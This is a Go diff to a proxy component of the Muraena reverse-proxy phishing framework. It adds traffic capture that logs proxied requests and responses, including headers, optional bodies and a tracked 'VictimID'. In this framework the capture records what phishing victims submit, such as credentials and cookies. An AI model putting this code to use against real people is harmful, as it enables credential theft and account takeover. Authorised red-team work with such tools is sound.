@@ -3,6 +3,7 @@ package proxy
 import (
 	"bufio"
 	"bytes"
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -12,6 +13,8 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"sync/atomic"
+	"time"
 	"unicode/utf8"
 
 	"github.com/evilsocket/islazy/tui"
@@ -21,12 +24,52 @@ import (
 	"github.com/muraenateam/muraena/core"
 	"github.com/muraenateam/muraena/module/necrobrowser"
 
+	"github.com/muraenateam/muraena/core/capture"
 	"github.com/muraenateam/muraena/core/db"
 	"github.com/muraenateam/muraena/log"
 	"github.com/muraenateam/muraena/module/statichttp"
 	"github.com/muraenateam/muraena/module/tracking"
 	"github.com/muraenateam/muraena/session"
 )
+
+// flowCtxKeyType is an unexported type used as the context key for attaching
+// an in-flight capture.Flow to a request, so ResponseProcessor can retrieve
+// and complete the same flow that the director started.
+type flowCtxKeyType struct{}
+
+var flowCtxKey = flowCtxKeyType{}
+
+// headerMap flattens an http.Header into a map[string]string suitable for capture.Flow.
+func headerMap(h http.Header) map[string]string {
+	m := make(map[string]string, len(h))
+	for k, v := range h {
+		m[k] = strings.Join(v, ", ")
+	}
+	return m
+}
+
+// captureEnabled reports whether traffic capture is enabled in the session configuration.
+func captureEnabled(sess *session.Session) bool {
+	return sess.Config().Api.Traffic.Enable
+}
+
+// flowSeq is a process-wide monotonic counter appended to flow IDs to avoid
+// collisions when two requests are captured within the same nanosecond.
+var flowSeq uint64
+
+// snapshotBody reads and restores the request body, returning its contents as a string.
+func snapshotBody(req *http.Request) string {
+	if req.Body == nil {
+		return ""
+	}
+	buf, err := ioutil.ReadAll(req.Body)
+	if err != nil {
+		return ""
+	}
+	_ = req.Body.Close()
+	req.Body = ioutil.NopCloser(bytes.NewReader(buf))
+	return string(buf)
+}
 
 type MuraenaProxyInit struct {
 	Session  *session.Session
@@ -362,6 +405,12 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 		sess.Config().Transform.Base64.Padding,
 	}
 
+	// respTrace holds the tracking.Trace computed below (if tracking is
+	// enabled), reused when emitting the capture.Flow so we don't invoke
+	// muraena.Tracker.TrackResponse a second time (it has the side effect of
+	// setting tracking cookies/headers on the response).
+	var respTrace *tracking.Trace
+
 	if response.Request.Header.Get(muraena.Tracker.LandingHeader) != "" {
 		response.StatusCode = 302
 		response.Header.Add(muraena.Tracker.Header, response.Request.Header.Get(muraena.Tracker.Header))
@@ -457,6 +506,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	//
 	if muraena.Session.Config().Tracking.Enabled {
 		trace := muraena.Tracker.TrackResponse(response)
+		respTrace = trace
 		if trace.IsValid() {
 
 			var err error
@@ -564,6 +614,23 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 		}
 	}
 
+	// Traffic capture: complete and emit the flow started in the director,
+	// carrying both the original upstream body and Muraena's modified body.
+	if f, ok := response.Request.Context().Value(flowCtxKey).(*capture.Flow); ok && f != nil {
+		f.Status = response.StatusCode
+		f.ResHeaders = headerMap(response.Header)
+		if sess.Config().Api.Traffic.CaptureBodies {
+			f.ResBodyOriginal = string(responseBuffer)
+			f.ResBodyModified = newBody
+		}
+		f.ResSize = len(newBody)
+		f.DurationMs = time.Since(f.Timestamp).Milliseconds()
+		if respTrace != nil && respTrace.IsValid() {
+			f.VictimID = respTrace.ID
+		}
+		capture.Emit(*f)
+	}
+
 	err = modResponse.Encode([]byte(newBody))
 	if err != nil {
 		log.Info("Error processing the body: %+v", err)
@@ -622,6 +689,24 @@ func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
 		if err = muraena.RequestProcessor(r); err != nil {
 			log.Error(err.Error())
 			return
+		}
+
+		if captureEnabled(sess) {
+			f := &capture.Flow{
+				ID:         fmt.Sprintf("%d-%d", time.Now().UnixNano(), atomic.AddUint64(&flowSeq, 1)),
+				Timestamp:  time.Now(),
+				Method:     r.Method,
+				Host:       r.Host,
+				Path:       r.URL.Path,
+				Query:      r.URL.RawQuery,
+				ReqHeaders: headerMap(r.Header),
+			}
+			if sess.Config().Api.Traffic.CaptureBodies {
+				f.ReqBody = snapshotBody(r)
+			}
+			f.ReqSize = len(f.ReqBody)
+			ctx := context.WithValue(r.Context(), flowCtxKey, f)
+			*r = *r.WithContext(ctx)
 		}
 
 		// Send the request to the target
